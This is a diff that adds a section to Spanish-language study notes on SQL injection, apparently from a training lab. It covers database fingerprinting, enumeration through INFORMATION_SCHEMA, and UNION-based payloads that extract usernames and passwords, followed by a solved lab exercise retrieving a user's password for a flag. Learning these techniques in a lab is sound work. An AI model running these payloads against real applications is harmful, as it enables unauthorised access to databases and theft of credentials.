@@ -23,7 +23,13 @@ Tags:
 			- [[#Descubrir el número de columnas#Union|Union]]
 	- [[#Authentication Bypass#Location of Injection|Location of Injection]]
 		- [[#Location of Injection#Ejercicio Resuelto|Ejercicio Resuelto]]
-
+- [[#Enumeración de base de datos|Enumeración de base de datos]]
+	- [[#Enumeración de base de datos#INFORMATION_SCHEMA Database|INFORMATION_SCHEMA Database]]
+		- [[#INFORMATION_SCHEMA Database#SCHEMATA|SCHEMATA]]
+		- [[#INFORMATION_SCHEMA Database#TABLES|TABLES]]
+		- [[#INFORMATION_SCHEMA Database#COLUMNS|COLUMNS]]
+		- [[#INFORMATION_SCHEMA Database#Data|Data]]
+	- [[#Enumeración de base de datos#Ejercicio Resuelto|Ejercicio Resuelto]]
 
 
 La mayoría de aplicaciones tienen una base de datos para guardar información de lo que sucede en la aplicación. Para conseguir que la web sea dinámica, se necesita interactuar en tiempo real con la base de datos.
@@ -492,6 +498,146 @@ a' UNION select 1,user(),3,4 -- -
 Mostrándonos así el usuario activo en bbdd:
 
 ![[Captura de pantalla 2024-11-27 a las 19.26.39.png]]
+
+## Enumeración de base de datos
+
+Ahora que ya sabemos que payloads son las que nos permiten recibir información de la base de datos, en esta sección dejaré apuntes sobre funciones que podremos usar para recuperar información propia de la base de datos.
+
+SELECT @@version: Nos permite saber que versión de MSSQL se está utilizando, y nos dará un error si se está utilizando con otro DBMS que no sea este.
+
+SELECT POW(1,1): Nos devolverá un 1 si es MySQL, si no, nos dará un error.
+
+SELECT SLEEP(5): Nos devolverá un 0, y tardará 5 segundos en enviar la respuesta. En otros DBMS no habrá el delay de 5 segundos.
+
+### INFORMATION_SCHEMA Database
+
+Esta base de datos contiene toda la información que necesitemos, como listado de bases de datos, el listado de tablas de cada base de datos, y el listado de columnas de cada tabla.
+
+#### SCHEMATA
+
+Para comenzar nuestra enumeración deberemos de saber que bases de datos están disponibles en nuestro DBMS. La tabla SCHEMATA nos proporcionará esto y podremos acceder a ella con la siguiente query:
+
+```sql
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+
+Lo que nos permitiría usarla de esta manera en un contexto de inyección SQL:
+
+```sql
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+Lo que nos proporcionaría lo siguiente:
+
+![[Pasted image 20241127194455.png]]
+
+También podremos usar la función database() para ver el nombre de la base de datos:
+
+```sql
+cn' UNION select 1,database(),2,3-- -
+```
+
+Lo que nos devolverá el nombre de la base de datos:
+
+![[Pasted image 20241127194530.png]]
+
+#### TABLES
+
+Ahora para sacar información de la base de datos, necesitaremos saber que tablas tenemos, por lo que podremos usar las columnas TABLE_SCHEMA y TABLE_NAME que estarán relacionadas con TABLE_SCHEMA (nombre de la base de datos), siendo TABLES la tabla que tenemos que usar de INFORMATION_SCHEMA.
+
+Quedándonos una query así:
+
+```sql
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+
+Y dándonos un resultado así:
+
+![[Pasted image 20241127194723.png]]
+
+Esto nos permitirá ver que hay 4 tablas en la base de datos 'dev'.
+
+#### COLUMNS
+
+Y ahora, para saber que sacar de cada tabla, necesitaremos saber que columnas hay. Por ejemplo, nos interesaría la tabla credentials, por lo que haríamos la query a la tabla COLUMNS de INFORMATION_SCHEMA, con la condición where del nombre de la tabla. Resultando así en la siguiente query:
+
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+Y ahora conseguiremos ver las columnas que tiene esta tabla:
+
+![[Pasted image 20241127195002.png]]
+
+#### Data
+
+Ahora que tenemos toda esta información, queremos extraer los datos de estas columnas. Para esto tendremos que volver a nuestra query UNION SELECT del inicio, y poner el nombre de las columnas que queramos en nuestra payload, siguiendo de la cláusula from y la base de datos que queremos usar y la tabla:
+
+```sql
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+
+Resultando en lo siguiente:
+
+![[Pasted image 20241127195128.png]]
+
+### Ejercicio Resuelto
+
+Se nos presenta la web del laboratorio anterior, por lo que ya sabemos que es vulnerable.
+
+Procedemos a hacer una payload que nos permita ver los nombres de las bases de datos.
+
+```sql
+cn' UNION SELECT 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA -- -
+```
+
+![[Captura de pantalla 2024-11-27 a las 19.54.31.png]]
+
+Perfecto, tenemos 5 bases de datos posibles, ahora necesitaremos saber cual es la que está activa:
+
+```sql
+cn' UNION select 1,database(),2,3-- -
+```
+
+![[Captura de pantalla 2024-11-27 a las 19.55.30.png]]
+
+Ahora vemos que la base de datos activa es la que se muestra en pantalla.
+
+Procederemos a ver que tablas hay dentro de esta base de datos con esta payload:
+
+```sql
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
+```
+
+![[Captura de pantalla 2024-11-27 a las 19.56.54.png]]
+
+Ahora vemos las 3 tablas que hay en esta base de datos, nuestro interés está puesto en la tabla users, por lo que nos interesa saber que columnas tiene esta tabla, para lo que usaremos la siguiente payload:
+
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
+```
+
+Hemos conseguido ver que columnas forman esta tabla, por lo que nuestro foco está puesto en la columna password, así que ya tenemos lo suficiente para recuperar la password del usuario 'newuser'.
+
+![[Captura de pantalla 2024-11-27 a las 19.58.51.png]]
+
+```sql
+cn' UNION SELECT 1,password,3,4 from ilfreight.users WHERE username = 'newuser' -- -
+```
+
+Y esto nos proporcionará la flag que necesitamos.
+
 
 ---
 # {{References}}
